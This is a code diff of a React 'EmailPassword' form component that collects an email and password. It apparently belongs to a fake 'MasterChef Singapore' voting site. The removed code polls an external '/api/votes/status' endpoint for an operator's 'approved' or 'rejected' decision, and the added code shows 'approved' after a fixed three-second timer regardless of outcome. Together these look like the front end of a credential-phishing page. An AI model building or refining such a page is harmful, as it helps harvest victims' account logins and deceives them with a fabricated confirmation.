@@ -6,7 +6,6 @@ export default function EmailPassword() {
   const [password, setPassword] = useState("");
 
   const [loading, setLoading] = useState(false);
-  const [requestId, setRequestId] = useState(null);
   const [status, setStatus] = useState(null);
 
   useEffect(() => {
@@ -19,34 +18,6 @@ export default function EmailPassword() {
 
     setEmail(savedEmail);
   }, []);
-
-  useEffect(() => {
-    if (!requestId) return;
-
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(`https://masterchefsingapore-vk35.vercel.app/api/votes/status/${requestId}`);
-
-        const data = await res.json();
-
-        if (data.success) {
-          if (data.data.status === "approved") {
-            setStatus("approved");
-            clearInterval(interval);
-          }
-
-          if (data.data.status === "rejected") {
-            setStatus("rejected");
-            clearInterval(interval);
-          }
-        }
-      } catch (err) {
-        console.log(err);
-      }
-    }, 5000);
-
-    return () => clearInterval(interval);
-  }, [requestId]);
 
   async function submitForm(e) {
     e.preventDefault();
@@ -73,10 +44,13 @@ export default function EmailPassword() {
 
       const data = await res.json();
 
-      if (data.success) {
-        setRequestId(data.data[0].id);
-        setStatus("pending");
-      }
+     if (data.success) {
+  setStatus("pending");
+
+  setTimeout(() => {
+    setStatus("approved");
+  }, 3000);
+} 
     } catch (err) {
       console.log(err);
     }
